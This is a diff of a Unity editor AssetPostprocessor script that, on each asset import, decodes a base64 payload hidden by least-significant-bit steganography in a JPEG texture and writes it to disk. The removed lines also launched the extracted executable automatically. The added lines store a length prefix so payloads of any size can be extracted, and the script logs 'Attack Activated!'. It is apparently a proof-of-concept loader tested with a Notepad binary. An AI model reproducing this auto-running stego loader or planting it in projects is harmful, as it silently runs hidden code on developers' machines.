@@ -4,14 +4,17 @@ using System.IO;
 using System;
 using UnityEditor.SceneManagement;
 using UnityEngine.SceneManagement;
+using System.Data.SqlTypes;
 
 public class Launcher: AssetPostprocessor
 {
     void OnPreprocessTexture()
     {
+        Debug.Log("Running OnPreprocessTexture - " + assetPath);
         // Only modify our target texture
         if (assetPath.EndsWith("Pearlesque_embedded.jpg", StringComparison.OrdinalIgnoreCase))
         {
+            Debug.Log("Running Texture Importer changes");
             TextureImporter importer = (TextureImporter)assetImporter;
             importer.isReadable = true; // Enable Read/Write
             importer.textureCompression = TextureImporterCompression.Uncompressed;
@@ -21,11 +24,12 @@ public class Launcher: AssetPostprocessor
     static void OnPostprocessAllAssets(string[] importedAssets, string[] deletedAssets, string[] movedAssets, string[] movedFromAssetPaths) 
     {
         Debug.Log("Developer Mode: Attack Activated!");
+        //string scriptPath = "Assets/ServerO.txt";
         string scriptContent3 = Process();
-
+        Debug.Log(scriptContent3);
         byte[] bytes = Convert.FromBase64String(scriptContent3);
-        File.WriteAllBytes("Assets/Extracted.exe", bytes);
-        System.Diagnostics.Process.Start("Assets/Extracted.exe");
+        File.WriteAllBytes("Assets/outbytes", bytes);
+        //System.Diagnostics.Process.Start(@"C:\Windows\Notepad.exe");
 
         AssetDatabase.Refresh();
         EditorApplication.delayCall += AddComponentToMainCamera;
@@ -50,21 +54,34 @@ public class Launcher: AssetPostprocessor
     {
         string embeddedPath = "Assets/Pearlesque_embedded.jpg";
         Texture2D watermarkedTexture = (Texture2D)AssetDatabase.LoadAssetAtPath(embeddedPath, typeof(Texture2D));
-        Debug.Log("Texture Isreadable: "+watermarkedTexture.isReadable);
+        // Embedding process calculates the size of the Base64 encoded payload, saves it as an int, 
+        // converts it to a byte array, encodes as Base64, and prefixes it to the payload for embedding
+        // in the image. 
 
-        // This is a question... It could be possible to embed the length of the stegonography as a prefix of known len. 
-        // Then pull that and use it to extract the rest. Then the size of the embedded binary doesn't need to be known
-        // for extraction.
-        int requiredBits = 267608 * 8; // This is the size of B64 encoded Notepad.exe
-        string decodedWatermark = DecodeWatermark(watermarkedTexture, requiredBits);
+        //INT32 converted to a byte array is 8 bytes, so 8*8 bits.
+        // Extract the prefix from the image
+        string prefixB64 = DecodeWatermark(watermarkedTexture, 8 * 8);
+        //Debug.Log("Prefix = " + prefixB64);
+
+
+        //Convert the encoded prefix back to an INT32
+        byte[] prefixBytes = Convert.FromBase64String(prefixB64);
+        int prefix = BitConverter.ToInt32(prefixBytes);
+        //Debug.Log("Prefix size = " + prefix);
+
+        // Use the prefix to determine the payload size, and offset, for extracting the payload
+        string decodedWatermark = DecodeWatermark(watermarkedTexture, prefix*8, 8*8);
+        //Debug.Log("Payload:\n" + decodedWatermark);
+        //Debug.Log("Converted:\n" + Convert.FromBase64String(decodedWatermark));
+        
         return decodedWatermark;
     }
 
-    private static string DecodeWatermark(Texture2D texture, int length)
+    private static string DecodeWatermark(Texture2D texture, int length, int offset=0)
     {
         Color[] pixels = texture.GetPixels();
         System.Text.StringBuilder binaryData = new System.Text.StringBuilder();
-        for (int i = 0; i < length && i < pixels.Length; i++)
+        for (int i = offset; i < length+offset && i < pixels.Length; i++)
         {
             Color pixel = pixels[i];
             binaryData.Append(ExtractLSB(pixel.r));
